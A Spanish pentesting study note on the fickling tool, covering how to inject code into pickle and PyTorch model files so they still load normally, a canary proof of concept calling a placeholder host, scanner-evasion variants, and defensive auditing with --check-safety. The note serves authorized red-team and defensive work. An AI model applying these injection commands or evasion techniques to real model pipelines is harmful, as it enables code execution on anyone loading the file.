---
tags:
  - IA/Red-Team
  - Pentesting/Explotacion
  - IA
Descripción: "fickling no solo lee pickle: lo reescribe"
Fecha de actualización: 2026-07-28
Nota previa: "[[00 - Qué es fickling y análisis de pickle]]"
Nota siguiente: 
Area: "[[Fickling.base|Fickling]]"
---
---

`fickling` no solo lee `pickle`: **lo reescribe**. Es lo que la convierte en herramienta de red team y no solo en escáner.

# Inyectar un payload

```shell-session
$ fickling --inject "print('Malicious')" file.pkl > malicious.pkl
```

Toma un `pickle` legítimo y le añade código que se ejecutará al deserializarlo, **conservando el objeto original**. El fichero resultante sigue cargando el modelo o la estructura de datos que llevaba; simplemente hace algo más antes.

<mark style="background: #FF5582A6;">Esa preservación es la clave y es lo que lo hace peligroso: el artefacto sigue funcionando.</mark> Si alguien lo carga y comprueba que el modelo predice correctamente, concluirá que está bien. Es la misma propiedad que hace indetectable un [[08 - Backdoors y trojans en modelos|trojan]], aplicada al contenedor en lugar de a los pesos.

Comparado con construir el ataque a mano como en [[13 - Ejecución del ataque de esteganografía]], `--inject` resuelve en un comando lo que allí son cincuenta líneas — a cambio de menos control sobre la forma final del payload.

# Los tres usos en un engagement

## 1 · Auditar los artefactos del cliente

El uso con mejor relación esfuerzo/hallazgo de toda la infraestructura de ML. Se pasa `--check-safety` sobre cada fichero de modelo que el cliente carga en producción:

```shell-session
$ for f in $(find ./models -name "*.pth" -o -name "*.pkl" -o -name "*.bin"); do
    echo "== $f"; fickling --check-safety -p "$f"
  done
```

Segundos de ejecución. Si algo salta, se descompila para saber qué hace y se reporta con el AST como evidencia.

## 2 · Demostrar la deserialización insegura

Es la prueba de concepto para el hallazgo crítico de [[11 - Pickle y la deserialización insegura de modelos]]. El procedimiento, en un engagement autorizado:

1. **Confirmar el sink**: la aplicación llama a `torch.load()` con `weights_only=False`, o carga `.pkl` de scikit-learn, o acepta modelos subidos por el usuario.
2. **Preparar un artefacto con payload de canario**, no con reverse shell:
   ```shell-session
   $ fickling --inject "import urllib.request; urllib.request.urlopen('https://<canario>/pwn')" modelo_legitimo.pth > poc.pth
   ```
3. **Entregarlo** por la vía que corresponda: subida, sustitución en el bucket, ruta de despliegue.
4. **Confirmar la ejecución** con el hit en el canario.

<mark style="background: #8000E1A6;">El canario demuestra la RCE igual de bien que una shell y no deja acceso interactivo abierto.</mark> Solo se escala a shell si el alcance lo pide por escrito ([[13 - Ejecución del ataque de esteganografía#Qué se reporta|criterio de reporte]]).

## 3 · Medir la cobertura del escáner del cliente

El más valioso de los tres y el que casi nadie hace. Si el cliente **ya tiene** un escáner de modelos en su pipeline, la pregunta no es si escanea, es **qué se le escapa**.

Se construyen variantes con `--inject` y ofuscación creciente y se comprueba cuáles pasa su escáner:

| Variante | Qué comprueba |
| - | - |
| `--inject` directo con `os.system` | ¿Detecta lo evidente? |
| Payload en una importación menos habitual | ¿La lista de globals peligrosos está completa? |
| Payload codificado, decodificado en tiempo de ejecución | ¿Detecta patrones o solo cadenas? |
| Payload en [[12 - Esteganografía en tensores\|los LSB de un tensor]], con solo el cargador visible | ¿Detecta la lógica del cargador? |
| Artefacto colocado en la **ruta de despliegue**, no en el registro | ¿Dónde está el control? |

<mark style="background: #FFB86CA6;">El resultado es un hallazgo mucho más accionable que "no tienen escáner": es un mapa de qué evade el que tienen.</mark> Y la última fila suele ser la que gana — el escaneo está en la subida al registro y el artefacto pasa por varios puntos más.

# Como defensa

Para el lado azul, `fickling` da dos cosas que un escáner no:

- **`fickling.load()` como sustituto de `pickle.load()`** en código que deba aceptar ficheros semi-confiables. Comprueba antes de cargar y lanza `UnsafeFileError`. No sustituye a migrar a [[11 - Pickle y la deserialización insegura de modelos#Alternativas seguras|`safetensors`]], pero es aplicable hoy sin cambiar el formato.
- **El AST para triaje de incidentes.** Si aparece un artefacto sospechoso, descompilarlo dice exactamente qué habría hecho — información imposible de obtener de un escáner que solo devuelve un veredicto.

> [!warning]+ Uso responsable
> `--inject` construye artefactos maliciosos funcionales. Aplica el mismo criterio que a cualquier payload: **alcance por escrito**, canario en vez de shell salvo autorización expresa, y **retirada del artefacto al cierre del engagement**. Un `.pth` con payload olvidado en un bucket sigue disparándose meses después, contra quien lo cargue.
